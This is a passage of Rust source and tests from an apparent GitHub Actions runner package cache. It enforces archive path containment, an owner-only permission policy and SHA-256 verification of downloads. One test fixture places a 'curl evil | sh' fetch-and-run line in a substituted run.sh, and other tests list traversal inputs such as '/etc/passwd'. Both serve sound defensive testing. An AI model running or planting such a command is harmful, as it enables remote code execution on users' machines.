fn resolve_inside(root: &Path, relative: &Path, raw: &str) -> Result<PathBuf, PackageError> {
    let unsafe_entry = || PackageError::UnsafeArchiveEntry {
        entry: raw.to_string(),
    };
    if relative.is_absolute() {
        return Err(unsafe_entry());
    }
    let mut resolved = root.to_path_buf();
    for component in relative.components() {
        match component {
            Component::Normal(part) => resolved.push(part),
            // `.` is harmless but carries no information; everything else —
            // `..`, a root, a drive prefix — is an escape attempt or a shape
            // this module refuses to guess about.
            Component::CurDir => {}
            Component::ParentDir | Component::RootDir | Component::Prefix(_) => {
                return Err(unsafe_entry());
            }
        }
    }
    if !is_inside(root, &resolved) {
        return Err(unsafe_entry());
    }
    Ok(resolved)
}

/// Whether `candidate` is `root` itself or lies beneath it, lexically.
///
/// Lexical on purpose: it must answer for paths that do not exist yet — an
/// archive entry's destination, an attempt's runtime directory before `e3`
/// creates it — and `canonicalize` cannot.
///
/// # Known limit
///
/// Components are compared byte-exactly, so on Windows a path differing from
/// the root only in case, or reaching it through an 8.3 short name, is not
/// recognised as inside. That would weaken [`PackageCache::lease`]'s workspace
/// guard, which is the caller that matters. It is latent rather than live:
/// every path on both sides of that comparison is derived from the same
/// [`AppPaths`] instance, so the spellings match by construction. Case-folding
/// here would be wrong for the archive-entry caller, where two entries
/// differing only in case are two entries — closing it properly means a
/// platform-aware comparison, not a `to_lowercase`.
fn is_inside(root: &Path, candidate: &Path) -> bool {
    let normalise = |path: &Path| -> Vec<std::ffi::OsString> {
        path.components()
            .filter_map(|component| match component {
                Component::Normal(part) => Some(part.to_os_string()),
                Component::RootDir => Some(std::ffi::OsString::from("/")),
                Component::Prefix(prefix) => Some(prefix.as_os_str().to_os_string()),
                Component::CurDir | Component::ParentDir => None,
            })
            .collect()
    };
    // A `..` anywhere in the candidate means the lexical answer is not
    // trustworthy, so refuse to claim containment.
    if candidate
        .components()
        .any(|c| matches!(c, Component::ParentDir))
    {
        return false;
    }
    let root = normalise(root);
    let candidate = normalise(candidate);
    candidate.len() >= root.len() && candidate[..root.len()] == root[..]
}

/// The only mode this agent ever applies to something it extracted.
///
/// **A mode published in an archive is not a security decision this agent
/// delegates.** Exactly one bit group is honoured — the executable bits,
/// because the runner's `run.sh`, `config.sh` and `bin/*` are useless without
/// them — and the owner gets read and write so the tree is usable. Everything
/// else is dropped: setuid and setgid, which would turn a downloaded package
/// into a privilege escalation; the sticky bit; and every group and other bit,
/// which would let another account on the machine rewrite the binaries every
/// future runner is launched from.
///
/// The result is **owner-only**, matching the `0700` posture `d1` already uses
/// for every directory it creates. Writing this as `(published & 0o111) |
/// 0o600` looks equivalent and is not: it carries the *group and other*
/// execute bits straight through from the archive, so a published `0755` would
/// leave every account on the machine able to execute the runner binaries. The
/// archive's only say here is whether the file is executable at all.
///
/// Deliberately **not** `cfg`-gated and deliberately pure, so the policy has
/// one definition, both extraction paths reach the same one, and it can be
/// asserted on a CI leg whose filesystem has no modes at all.
const fn policy_mode(published: u32) -> u32 {
    if published & 0o111 == 0 { 0o600 } else { 0o700 }
}

/// Apply [`policy_mode`] to something just extracted.
///
/// One function rather than a `cfg`-gated pair, so [`policy_mode`] is reached
/// on every target. As two functions the Windows build never called it, and
/// `-D warnings` failed the Windows leg on dead code — a small thing, but it
/// pointed at a real one: a security policy that is compiled out on a platform
/// is a policy nobody can be sure still exists there.
fn apply_mode_policy(path: &Path, mode: Option<u32>) -> Result<(), PackageError> {
    let Some(published) = mode else { return Ok(()) };
    let mode = policy_mode(published);
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        fs::set_permissions(path, fs::Permissions::from_mode(mode)).map_err(|source| {
            PackageError::Io {
                what: "set permissions on an extracted runner package file",
                path: path.to_path_buf(),
                source,
            }
        })
    }
    #[cfg(not(unix))]
    {
        // Windows has no mode bits to apply, and the `.zip` packages are the
        // Windows ones — which is exactly why the policy has to be enforced on
        // the `.tar.gz` path, the one that runs where modes exist.
        let _ = (path, mode);
        Ok(())
    }
}

// ---------------------------------------------------------------------------
// Small filesystem helpers
// ---------------------------------------------------------------------------

/// Remove a file, treating "it was not there" as success.
///
/// Any other failure is reported: a download that could not be deleted is a
/// package sitting unverified on the operator's disk, which is worth a word.
fn remove_file_if_present(path: &Path, what: &'static str) -> Result<(), PackageError> {
    match fs::remove_file(path) {
        Ok(()) => Ok(()),
        Err(source) if source.kind() == io::ErrorKind::NotFound => Ok(()),
        Err(source) => Err(PackageError::Io {
            what,
            path: path.to_path_buf(),
            source,
        }),
    }
}

fn create_dir_all(path: &Path) -> Result<(), PackageError> {
    fs::create_dir_all(path).map_err(|source| PackageError::Io {
        what: "create a runner package cache directory",
        path: path.to_path_buf(),
        source,
    })
}

fn write_json<T: Serialize>(path: &Path, value: &T) -> Result<(), PackageError> {
    let encoded = serde_json::to_vec_pretty(value).map_err(|error| PackageError::Extract {
        detail: format!("the package manifest could not be encoded: {error}"),
    })?;
    fs::write(path, encoded).map_err(|source| PackageError::Io {
        what: "write a runner package cache file",
        path: path.to_path_buf(),
        source,
    })
}

/// Reads one lease, strictly.
///
/// The counterpart of [`read_json`], and deliberately not the same policy.
/// `read_json` treats a corrupt file as absent, which is right for a
/// **manifest**: the fallback there is "this directory is not an entry", and
/// the caller's next move is the same either way. It is wrong for a **lease**,
/// where the fallback would be "nothing holds this version" — the most
/// dangerous answer this module can give, and the one thing that would make an
/// otherwise fail-closed prune guard fail open.
///
/// # Errors
/// [`PackageError::UnreadableLease`] when the file exists and does not parse,
/// [`PackageError::Io`] when it cannot be read at all.
fn read_lease(path: &Path) -> Result<Option<Lease>, PackageError> {
    let bytes = match fs::read(path) {
        Ok(bytes) => bytes,
        Err(source) if source.kind() == io::ErrorKind::NotFound => return Ok(None),
        Err(source) => {
            return Err(PackageError::Io {
                what: "read a runner package lease",
                path: path.to_path_buf(),
                source,
            });
        }
    };
    serde_json::from_slice(&bytes)
        .map(Some)
        .map_err(|_| PackageError::UnreadableLease {
            path: path.to_path_buf(),
        })
}

/// Reads a JSON file, answering `None` when it is absent or unreadable as `T`.
///
/// A corrupt manifest reads as "not an entry" rather than as an error: the
/// caller's next move is the same either way — treat the directory as not
/// installed — and a cache that refuses to answer at all because one directory
/// is damaged is worse than one that ignores it.
fn read_json<T: for<'de> Deserialize<'de>>(path: &Path) -> Result<Option<T>, PackageError> {
    let bytes = match fs::read(path) {
        Ok(bytes) => bytes,
        Err(source) if source.kind() == io::ErrorKind::NotFound => return Ok(None),
        Err(source) => {
            return Err(PackageError::Io {
                what: "read a runner package cache file",
                path: path.to_path_buf(),
                source,
            });
        }
    };
    Ok(serde_json::from_slice(&bytes).ok())
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    use std::io::Write as _;
    use std::sync::atomic::{AtomicUsize, Ordering};

    use runner_manager_domain::attempt::AttemptState;
    use runner_manager_testkit::clock::FakeClock;
    use runner_manager_testkit::fixtures;
    use runner_manager_testkit::github as gh;

    // -- archive fixtures --------------------------------------------------

    /// A real `.zip`, built in memory.
    fn zip_bytes(entries: &[(&str, &str)]) -> Vec<u8> {
        let mut writer = zip::ZipWriter::new(io::Cursor::new(Vec::new()));
        let options = zip::write::SimpleFileOptions::default();
        for (name, body) in entries {
            writer
                .start_file(*name, options)
                .expect("start a zip entry");
            writer
                .write_all(body.as_bytes())
                .expect("write a zip entry");
        }
        writer.finish().expect("finish the zip").into_inner()
    }

    /// A real `.tar.gz`, built in memory.
    fn tar_gz_bytes(entries: &[(&str, &str)]) -> Vec<u8> {
        let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
        let mut builder = tar::Builder::new(encoder);
        for (name, body) in entries {
            let mut header = tar::Header::new_gnu();
            header.set_size(body.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            builder
                .append_data(&mut header, name, body.as_bytes())
                .expect("append a tar entry");
        }
        builder
            .into_inner()
            .expect("finish the tar")
            .finish()
            .expect("finish the gzip")
    }

    /// A `.tar.gz` carrying an entry name that `tar::Builder` refuses to write.
    ///
    /// `append_data` rejects a path containing `..` outright — "paths in
    /// archives must not have `..`" — which is a fine default and a useless
    /// fixture: an attacker does not use `tar::Builder`. The header is
    /// therefore filled in by hand and appended raw, so the archive under test
    /// is the archive a hostile producer would actually emit.
    fn tar_gz_with_raw_name(name: &str, body: &str) -> Vec<u8> {
        let mut header = tar::Header::new_gnu();
        header.set_size(body.len() as u64);
        header.set_mode(0o644);
        header.set_entry_type(tar::EntryType::Regular);
        {
            let gnu = header.as_gnu_mut().expect("a GNU header");
            let bytes = name.as_bytes();
            assert!(bytes.len() < gnu.name.len(), "the fixture name must fit");
            gnu.name[..bytes.len()].copy_from_slice(bytes);
        }
        header.set_cksum();

        let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
        let mut builder = tar::Builder::new(encoder);
        builder
            .append(&header, body.as_bytes())
            .expect("append a raw tar entry");
        builder
            .into_inner()
            .expect("finish the tar")
            .finish()
            .expect("finish the gzip")
    }

    /// A `.tar.gz` carrying one entry with an exact mode and entry type.
    ///
    /// `tar::Header::set_mode` writes the value verbatim with no masking, which
    /// is what lets a fixture carry a setuid bit — the thing a published
    /// archive could carry and this module must refuse to apply.
    fn tar_gz_special(
        name: &str,
        body: &str,
        mode: u32,
        kind: tar::EntryType,
        link_target: Option<&str>,
    ) -> Vec<u8> {
        let is_link = matches!(kind, tar::EntryType::Symlink | tar::EntryType::Link);
        let mut header = tar::Header::new_gnu();
        header.set_size(if is_link { 0 } else { body.len() as u64 });
        header.set_mode(mode);
        header.set_entry_type(kind);
        if let Some(target) = link_target {
            header
                .set_link_name_literal(target)
                .expect("a raw link target");
        }
        {
            let gnu = header.as_gnu_mut().expect("a GNU header");
            let bytes = name.as_bytes();
            assert!(bytes.len() < gnu.name.len(), "the fixture name must fit");
            gnu.name[..bytes.len()].copy_from_slice(bytes);
        }
        header.set_cksum();

        let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
        let mut builder = tar::Builder::new(encoder);
        let data: &[u8] = if is_link { &[] } else { body.as_bytes() };
        builder
            .append(&header, data)
            .expect("append a raw tar entry");
        builder
            .into_inner()
            .expect("finish the tar")
            .finish()
            .expect("finish the gzip")
    }

    /// Read one entry's header back out of a `.tar.gz`.
    ///
    /// Every fixture below is checked through this before it is used. A test
    /// that asserts "the setuid bit was not applied" proves nothing if the
    /// fixture never carried one.
    fn first_entry_header(bytes: &[u8]) -> (u32, tar::EntryType, Option<PathBuf>) {
        let mut archive = tar::Archive::new(flate2::read::GzDecoder::new(io::Cursor::new(
            bytes.to_vec(),
        )));
        let mut entries = archive.entries().expect("entries");
        let entry = entries
            .next()
            .expect("one entry")
            .expect("a readable entry");
        let link = entry
            .link_name()
            .expect("a link name field")
            .map(|path| path.into_owned());
        let header = entry.header();
        (header.mode().expect("a mode"), header.entry_type(), link)
    }

    /// The two entries every fixture package carries.
    fn package_entries() -> Vec<(&'static str, &'static str)> {
        vec![
            ("run.sh", "#!/bin/sh\necho runner\n"),
            ("bin/Runner.Listener", "listener\n"),
        ]
    }

    fn hex_digest(bytes: &[u8]) -> String {
        let mut hasher = Sha256::new();
        hasher.update(bytes);
        hex::encode(hasher.finalize())
    }

    /// Build one published-download record.
    fn published(
        os: &str,
        arch: &str,
        version: &str,
        extension: &str,
        digest: Option<&str>,
    ) -> RunnerDownload {
        let filename = format!("actions-runner-{os}-{arch}-{version}{extension}");
        RunnerDownload {
            os: os.to_string(),
            architecture: arch.to_string(),
            download_url: format!(
                "https://github.com/actions/runner/releases/download/v{version}/{filename}"
            ),
            filename,
            sha256_checksum: digest.map(str::to_string),
        }
    }

    // -- fake ports --------------------------------------------------------

    #[derive(Debug, Clone)]
    enum Answer {
        Downloads(Vec<RunnerDownload>),
        Rejected,
        Unavailable,
    }

    #[derive(Debug)]
    struct FakeCatalog {
        answer: Mutex<Answer>,
        calls: AtomicUsize,
    }

    impl FakeCatalog {
        fn with(downloads: Vec<RunnerDownload>) -> Arc<Self> {
            Self::answering(Answer::Downloads(downloads))
        }

        fn answering(answer: Answer) -> Arc<Self> {
            Arc::new(Self {
                answer: Mutex::new(answer),
                calls: AtomicUsize::new(0),
            })
        }

        fn publish(&self, downloads: Vec<RunnerDownload>) {
            *self.answer.lock().unwrap() = Answer::Downloads(downloads);
        }

        fn calls(&self) -> usize {
            self.calls.load(Ordering::SeqCst)
        }
    }

    #[async_trait::async_trait]
    impl DownloadCatalog for FakeCatalog {
        async fn published(&self) -> Result<RunnerDownloads, PackageError> {
            self.calls.fetch_add(1, Ordering::SeqCst);
            let answer = self.answer.lock().unwrap().clone();
            match answer {
                Answer::Downloads(entries) => Ok(RunnerDownloads::new(entries)),
                Answer::Rejected => Err(PackageError::VersionRejected {
                    version: None,
                    detail: Some("the runner version is no longer supported".to_string()),
                }),
                Answer::Unavailable => Err(PackageError::CatalogUnavailable {
                    detail: "502 Bad Gateway".to_string(),
                }),
            }
        }
    }

    #[derive(Debug)]
    struct FakeFetcher {
        payload: Mutex<Vec<u8>>,
        /// Every `(url, destination)` this fetcher was asked for, in order.
        calls: Mutex<Vec<(String, PathBuf)>>,
        /// Destinations that genuinely existed on disk immediately after the
        /// fetch returned. This is what stops the "partial file is removed"
        /// assertion from passing over a file that was never created.
        wrote: Mutex<Vec<PathBuf>>,
        fail: Mutex<bool>,
    }

    impl FakeFetcher {
        fn with(payload: Vec<u8>) -> Arc<Self> {
            Arc::new(Self {
                payload: Mutex::new(payload),
                calls: Mutex::new(Vec::new()),
                wrote: Mutex::new(Vec::new()),
                fail: Mutex::new(false),
            })
        }

        fn serve(&self, payload: Vec<u8>) {
            *self.payload.lock().unwrap() = payload;
        }

        fn calls(&self) -> Vec<(String, PathBuf)> {
            self.calls.lock().unwrap().clone()
        }

        fn count(&self) -> usize {
            self.calls.lock().unwrap().len()
        }

        fn wrote(&self) -> Vec<PathBuf> {
            self.wrote.lock().unwrap().clone()
        }
    }

    #[async_trait::async_trait]
    impl PackageFetcher for FakeFetcher {
        async fn fetch(&self, url: &str, destination: &Path) -> Result<u64, PackageError> {
            self.calls
                .lock()
                .unwrap()
                .push((url.to_string(), destination.to_path_buf()));
            if *self.fail.lock().unwrap() {
                return Err(PackageError::Download {
                    detail: "connection reset".to_string(),
                });
            }
            let payload = self.payload.lock().unwrap().clone();
            fs::write(destination, &payload).expect("the fake fetcher writes its payload");
            assert!(
                destination.is_file(),
                "the fake fetcher must actually create the file, or every \
                 assertion about removing it is vacuous"
            );
            self.wrote.lock().unwrap().push(destination.to_path_buf());
            Ok(payload.len() as u64)
        }
    }

    // -- harness -----------------------------------------------------------

    struct Harness {
        _dir: tempfile::TempDir,
        paths: AppPaths,
        catalog: Arc<FakeCatalog>,
        fetcher: Arc<FakeFetcher>,
        clock: Arc<FakeClock>,
    }

    impl Harness {
        fn new(downloads: Vec<RunnerDownload>, payload: Vec<u8>) -> Self {
            let dir = tempfile::tempdir().expect("a temporary root");
            let paths = AppPaths::rooted_at(dir.path());
            Self {
                _dir: dir,
                paths,
                catalog: FakeCatalog::with(downloads),
                fetcher: FakeFetcher::with(payload),
                clock: Arc::new(FakeClock::default()),
            }
        }

        fn with_catalog(mut self, catalog: Arc<FakeCatalog>) -> Self {
            self.catalog = catalog;
            self
        }

        fn cache(&self) -> PackageCache {
            self.cache_for(Os::Linux, Arch::X64)
        }

        fn cache_for(&self, os: Os, arch: Arch) -> PackageCache {
            PackageCache::new(
                &self.paths,
                os,
                arch,
                CachePorts {
                    catalog: self.catalog.clone(),
                    fetcher: self.fetcher.clone(),
                    backoff: Arc::new(NoBackoff),
                    clock: self.clock.clone(),
                },
            )
        }
    }

    /// One `.tar.gz` package published for `linux/x64`, with the digest GitHub
    /// would have published for those exact bytes.
    fn linux_fixture() -> (Harness, Vec<u8>, String) {
        let payload = tar_gz_bytes(&package_entries());
        let digest = hex_digest(&payload);
        let downloads = vec![published(
            "linux",
            "x64",
            "2.330.0",
            ".tar.gz",
            Some(&digest),
        )];
        (Harness::new(downloads, payload.clone()), payload, digest)
    }

    /// Every path under `root`, for asserting that nothing landed somewhere.
    fn all_paths(root: &Path) -> Vec<String> {
        fn walk(base: &Path, dir: &Path, out: &mut Vec<String>) {
            let Ok(entries) = fs::read_dir(dir) else {
                return;
            };
            for entry in entries.flatten() {
                let path = entry.path();
                out.push(
                    path.strip_prefix(base)
                        .unwrap_or(&path)
                        .to_string_lossy()
                        .replace('\\', "/"),
                );
                if path.is_dir() {
                    walk(base, &path, out);
                }
            }
        }
        let mut out = Vec::new();
        walk(root, root, &mut out);
        out.sort();
        out
    }

    fn version(raw: &str) -> RunnerVersion {
        RunnerVersion::parse(raw).expect("a well-formed test version")
    }

    // =====================================================================
    // Value types: the version is a path component, so parsing it is a
    // security control rather than a convenience.
    // =====================================================================

    #[test]
    fn a_version_is_two_to_four_runs_of_digits_and_nothing_else() {
        for good in ["2.330.0", "2.9", "1.2.3.4", "0.0.0"] {
            assert!(
                RunnerVersion::parse(good).is_ok(),
                "`{good}` should parse as a version"
            );
        }
        // Everything here would be a usable path component, a traversal, or an
        // absolute path if it reached `Path::join`.
        for bad in [
            "",
            ".",
            "..",
            "../..",
            "2",
            "2.330.0.1.2",
            "a.b",
            "2.330.x",
            "2/330",
            "2\\330",
            "/2.330.0",
            "C:2.330.0",
            "2.330.0 ",
            " 2.330.0",
            "2..0",
            "2.330.0/../..",
        ] {
            assert!(
                RunnerVersion::parse(bad).is_err(),
                "`{bad}` must be refused: it becomes a directory name"
            );
        }
    }

    #[test]
    fn anything_that_parses_as_a_version_is_a_single_safe_path_component() {
        // The property the parser exists to buy. Asserted over the *dangerous*
        // candidates as well as the good ones: a version that parses is a
        // version that becomes a directory name, so the interesting claim is
        // "nothing that parses can escape", not "this one good value is fine".
        //
        // Asserting it over `2.330.0` alone was decorative — it stayed green
        // through a mutation that made `parse` accept `..`, because `2.330.0`
        // is a safe component whatever the parser does.
        for candidate in [
            "2.330.0",
            "2.9",
            "1.2.3.4",
            "",
            ".",
            "..",
            "../..",
            "2",
            "a.b",
            "2/330",
            "2\\330",
            "/2.330.0",
            "C:2.330.0",
            "2..0",
            "2.330.0/../..",
        ] {
            let Ok(parsed) = RunnerVersion::parse(candidate) else {
                continue;
            };
            let joined = Path::new("root").join(parsed.as_str());
            assert_eq!(
                joined.components().count(),
                2,
                "`{candidate}` parsed but adds more than one path component"
            );
            assert!(
                !joined
                    .components()
                    .any(|c| matches!(c, Component::ParentDir | Component::RootDir)),
                "`{candidate}` parsed but introduces a traversal or a root"
            );
        }
    }

    #[test]
    fn versions_order_numerically_not_lexically() {
        assert!(version("2.9.0") < version("2.10.0"));
        assert!(version("2.330.0") > version("2.329.9"));
    }

    #[test]
    fn a_version_is_read_out_of_the_published_filename() {
        // GitHub's runner-downloads response carries no version field; the
        // filename is the only signal there is.
        assert_eq!(
            RunnerVersion::from_filename("actions-runner-win-x64-2.330.0.zip").unwrap(),
            version("2.330.0")
        );
        assert_eq!(
            RunnerVersion::from_filename("actions-runner-linux-arm64-2.330.0.tar.gz").unwrap(),
            version("2.330.0")
        );
        // The fixture `c3` ships, so this module and that one agree on shape.
        let fixture = gh::download("osx", "arm64");
        assert_eq!(
            RunnerVersion::from_filename(&fixture.filename).unwrap(),
            version("2.330.0")
        );
    }

    #[test]
    fn an_archive_this_agent_cannot_extract_is_refused_by_name() {
        for bad in [
            "actions-runner-linux-x64-2.330.0.rar",
            "actions-runner-linux-x64-2.330.0",
            "actions-runner-linux-x64-2.330.0.tar.xz",
        ] {
            let error = RunnerVersion::from_filename(bad).unwrap_err();
            assert!(
                matches!(error, PackageError::UnsupportedArchive { .. }),
                "`{bad}` should be an unsupported archive, got {error:?}"
            );
            assert!(error.is_terminal());
        }
    }

    #[test]
    fn a_digest_is_sixty_four_hex_characters_normalised_to_lowercase() {
        let upper = "A".repeat(64);
        assert_eq!(Sha256Hex::parse(&upper).unwrap().as_str(), "a".repeat(64));
        for bad in ["", "abc", &"g".repeat(64), &"a".repeat(63), &"a".repeat(65)] {
            assert!(
                Sha256Hex::parse(bad).is_err(),
                "`{bad}` is not a SHA-256 digest"
            );
        }
    }

    #[test]
    fn a_malformed_published_digest_is_a_refusal_not_a_comparison_that_never_matches() {
        // The failure mode this parse exists to prevent: an `sha256:`-prefixed
        // or truncated value compared as a string can never equal a real
        // digest, so verification would refuse every package forever while
        // looking like it worked.
        let error = Sha256Hex::parse("sha256:9f86d081884c7d65").unwrap_err();
        assert!(matches!(error, PackageError::MalformedDigest { .. }));
        assert!(error.is_terminal());
        assert!(error.operator_action().is_some());
    }

    // =====================================================================
    // Path containment. Lexical, because it must answer for paths that do
    // not exist yet.
    // =====================================================================

    #[test]
    fn containment_answers_for_paths_that_do_not_exist() {
        let root = Path::new("/cache/packages");
        assert!(is_inside(root, Path::new("/cache/packages")));
        assert!(is_inside(root, Path::new("/cache/packages/2.330.0/bin/x")));
        assert!(!is_inside(root, Path::new("/cache")));
        assert!(!is_inside(root, Path::new("/cache/packages-other/x")));
        assert!(!is_inside(root, Path::new("/elsewhere/2.330.0")));
        // A `..` anywhere makes the lexical answer untrustworthy, so it is
        // never reported as contained.
        assert!(!is_inside(root, Path::new("/cache/packages/../escape")));
    }

    #[test]
    fn an_archive_entry_may_not_resolve_outside_the_directory_it_is_extracted_into() {
        let root = Path::new("/cache/staging/root");
        assert!(resolve_inside(root, Path::new("bin/x"), "bin/x").is_ok());
        assert!(resolve_inside(root, Path::new("./bin/x"), "./bin/x").is_ok());
        for escape in ["../escape", "../../escape", "a/../../escape", "/etc/passwd"] {
            let error = resolve_inside(root, Path::new(escape), escape).unwrap_err();
            assert!(
                matches!(error, PackageError::UnsafeArchiveEntry { .. }),
                "`{escape}` must be refused, got {error:?}"
            );
        }
    }

    // =====================================================================
    // DoD 1 — the selected package matches the host, and an unsupported pair
    // is refused before any download.
    // =====================================================================

    #[tokio::test]
    async fn the_entry_matching_this_host_is_the_one_downloaded() {
        let payload = tar_gz_bytes(&package_entries());
        let digest = hex_digest(&payload);
        // Three published packages; only one is this host's. The decoys carry
        // the same digest so that picking the wrong one would still verify —
        // the test must fail on *selection*, not on the checksum.
        let harness = Harness::new(
            vec![
                published("win", "x64", "2.330.0", ".zip", Some(&digest)),
                published("linux", "x64", "2.330.0", ".tar.gz", Some(&digest)),
                published("osx", "arm64", "2.330.0", ".tar.gz", Some(&digest)),
            ],
            payload,
        );
        let cache = harness.cache_for(Os::Linux, Arch::X64);

        let installed = cache.ensure_installed().await.expect("an install");

        assert_eq!(installed.version(), &version("2.330.0"));
        let calls = harness.fetcher.calls();
        assert_eq!(calls.len(), 1);
        assert!(
            calls[0]
                .0
                .contains("actions-runner-linux-x64-2.330.0.tar.gz"),
            "the linux/x64 package should have been fetched, not `{}`",
            calls[0].0
        );
    }

    #[tokio::test]
    async fn each_documented_host_selects_its_own_published_package() {
        // The selection path is exercised for every documented pair on every CI
        // leg, because the format is derived from the filename rather than from
        // the host this test happens to run on.
        for (os, arch, token_os, token_arch, extension) in [
            (Os::Windows, Arch::X64, "win", "x64", ".zip"),
            (Os::MacOs, Arch::Arm64, "osx", "arm64", ".tar.gz"),
            (Os::Linux, Arch::Arm32, "linux", "arm", ".tar.gz"),
        ] {
            let payload = if extension == ".zip" {
                zip_bytes(&package_entries())
            } else {
                tar_gz_bytes(&package_entries())
            };
            let digest = hex_digest(&payload);
            let harness = Harness::new(
                vec![
                    published("win", "x64", "2.330.0", ".zip", Some(&digest)),
                    published("osx", "arm64", "2.330.0", ".tar.gz", Some(&digest)),
                    published("linux", "arm", "2.330.0", ".tar.gz", Some(&digest)),
                ],
                payload,
            );
            let cache = harness.cache_for(os, arch);

            let installed = cache
                .ensure_installed()
                .await
                .unwrap_or_else(|error| panic!("{os}/{arch} should install: {error}"));

            let url = &harness.fetcher.calls()[0].0;
            assert!(
                url.contains(&format!("actions-runner-{token_os}-{token_arch}-")),
                "{os}/{arch} fetched `{url}`"
            );
            assert!(installed.root().join("run.sh").is_file());
        }
    }

    #[tokio::test]
    async fn an_undocumented_host_is_refused_before_anything_is_requested() {
        let (harness, _, _) = linux_fixture();
        // `Arm32` is documented on Linux only; Windows on ARM32 is not a pair
        // this product supports.
        let cache = harness.cache_for(Os::Windows, Arch::Arm32);

        let error = cache.ensure_installed().await.unwrap_err();

        assert!(matches!(error, PackageError::UnsupportedHost(_)));
        assert!(error.is_terminal());
        assert!(error.operator_action().is_some());
        assert_eq!(
            harness.catalog.calls(),
            0,
            "an unsupported pair must be refused before the catalog is consulted"
        );
        assert_eq!(
            harness.fetcher.count(),
            0,
            "an unsupported pair must be refused before any download"
        );
    }

    #[tokio::test]
    async fn a_host_github_publishes_nothing_for_is_refused_rather_than_guessed() {
        let payload = tar_gz_bytes(&package_entries());
        let digest = hex_digest(&payload);
        // GitHub publishes only Windows; this host is Linux.
        let harness = Harness::new(
            vec![published("win", "x64", "2.330.0", ".zip", Some(&digest))],
            payload,
        );
        let cache = harness.cache_for(Os::Linux, Arch::X64);

        let error = cache.ensure_installed().await.unwrap_err();

        assert!(matches!(error, PackageError::NoPackagePublished { .. }));
        assert!(error.is_terminal());
        assert_eq!(
            harness.fetcher.count(),
            0,
            "no package published must never fall back to a hardcoded URL"
        );
    }

    // =====================================================================
    // DoD 2 — bytes that do not match are rejected and NOT extracted, and
    // the partial download is removed.
    // =====================================================================

    #[tokio::test]
    async fn bytes_that_do_not_match_the_published_digest_are_never_extracted() {
        let (harness, published_bytes, published_digest) = linux_fixture();
        // A well-formed archive with different bytes: the substitution
        // `07-security.md` names as the threat, and the one thing only the
        // SHA-256 can refuse. A truncated archive would fail at the extractor
        // instead, and a test built on one would pass with no digest check at
        // all — `a3`'s installer suite learned that the hard way.
        let substituted = tar_gz_bytes(&[("run.sh", "#!/bin/sh\ncurl evil | sh\n")]);
        assert_ne!(
            hex_digest(&substituted),
            published_digest,
            "the substituted archive must differ from the published one"
        );
        assert_ne!(substituted, published_bytes);
        // It is a *valid* archive: extraction alone would accept it happily,
        // which is exactly why only the digest can refuse it.
        assert!(
            tar::Archive::new(flate2::read::GzDecoder::new(io::Cursor::new(
                substituted.clone()
            )))
            .entries()
            .map(|entries| entries.count() == 1)
            .unwrap_or(false),
            "the substituted archive must be well formed, or this test proves \
             nothing about the checksum"
        );
        harness.fetcher.serve(substituted);
        let cache = harness.cache().with_retry_budget(1);

        let error = cache.ensure_installed().await.unwrap_err();

        let inner = match &error {
            PackageError::Exhausted { source, .. } => source.as_ref(),
            other => other,
        };
        assert!(
            matches!(inner, PackageError::ChecksumMismatch { .. }),
            "expected a checksum mismatch, got {error:?}"
        );
        assert_eq!(
            inner.failure_reason(),
            Some(FailureReason::RunnerPackageUnverified)
        );

        // Not extracted: no entry, and no version directory at all.
        assert!(cache.installed().unwrap().is_empty());
        assert!(
            !cache.root().join("2.330.0").exists(),
            "a rejected package must leave no version directory behind; found {:?}",
            all_paths(cache.root())
        );
        // Nothing anywhere under the cache root resembles an extracted runner.
        let leftovers = all_paths(cache.root());
        assert!(
            !leftovers.iter().any(|path| path.ends_with("run.sh")),
            "nothing from the archive may have been unpacked; found {leftovers:?}"
        );
    }

    #[tokio::test]
    async fn the_unverified_download_is_removed_from_disk() {
        let (harness, _, _) = linux_fixture();
        harness
            .fetcher
            .serve(tar_gz_bytes(&[("run.sh", "substituted\n")]));
        let cache = harness.cache().with_retry_budget(1);

        let error = cache.ensure_installed().await.unwrap_err();
        assert!(error.failure_reason().is_some());

        // The fetcher asserts internally that it created the file, and records
        // the path only after that assertion. Without this, "the file is gone"
        // would be true of a file that never existed.
        let wrote = harness.fetcher.wrote();
        assert_eq!(wrote.len(), 1, "the fetcher must have written exactly once");
        assert!(
            !wrote[0].exists(),
            "the unverified download at {:?} must have been removed",
            wrote[0]
        );

        // And no other copy of it survives anywhere in the cache.
        let leftovers = all_paths(cache.root());
        assert!(
            !leftovers.iter().any(|path| path.ends_with(".archive")),
            "no downloaded archive may survive a mismatch; found {leftovers:?}"
        );
    }

    #[tokio::test]
    async fn a_checksum_mismatch_is_retryable_and_clean_bytes_still_install() {
        // `03-control-flows.md`: a download checksum failure is retried with
        // bounded backoff. The usual cause is a truncated transfer, and the
        // next attempt gets clean bytes.
        let (harness, good, _) = linux_fixture();
        harness
            .fetcher
            .serve(tar_gz_bytes(&[("run.sh", "truncated\n")]));
        let cache = harness.cache().with_retry_budget(3);

        // First: three attempts, all bad, budget exhausted.
        let error = cache.ensure_installed().await.unwrap_err();
        assert!(matches!(error, PackageError::Exhausted { attempts: 3, .. }));
        assert_eq!(
            harness.fetcher.count(),
            3,
            "a mismatch is retryable, so the budget should have been spent"
        );

        // Then: the same cache, with the bytes GitHub actually published.
        harness.fetcher.serve(good);
        let installed = cache.ensure_installed().await.expect("clean bytes install");
        assert_eq!(installed.version(), &version("2.330.0"));
    }

    // =====================================================================
    // DoD 3 — an absent checksum fails closed and names the remedy; an
    // operator-pinned digest then succeeds.
    // =====================================================================

    #[tokio::test]
    async fn an_absent_published_checksum_refuses_to_install_and_names_the_remedy() {
        let payload = tar_gz_bytes(&package_entries());
        // `c3` ships this fixture precisely so this branch is reachable.
        let without = gh::download_without_checksum("linux", "x64");
        assert!(without.sha256_checksum().is_none());
        let harness = Harness::new(vec![without], payload);
        let cache = harness.cache();

        let error = cache.ensure_installed().await.unwrap_err();

        assert!(
            matches!(
                error,
                PackageError::ChecksumAbsent {
                    published: PublishedChecksum::Absent,
                    ..
                }
            ),
            "expected an absent checksum, got {error:?}"
        );
        assert!(error.is_terminal(), "failing closed is never retryable");
        assert_eq!(
            error.failure_reason(),
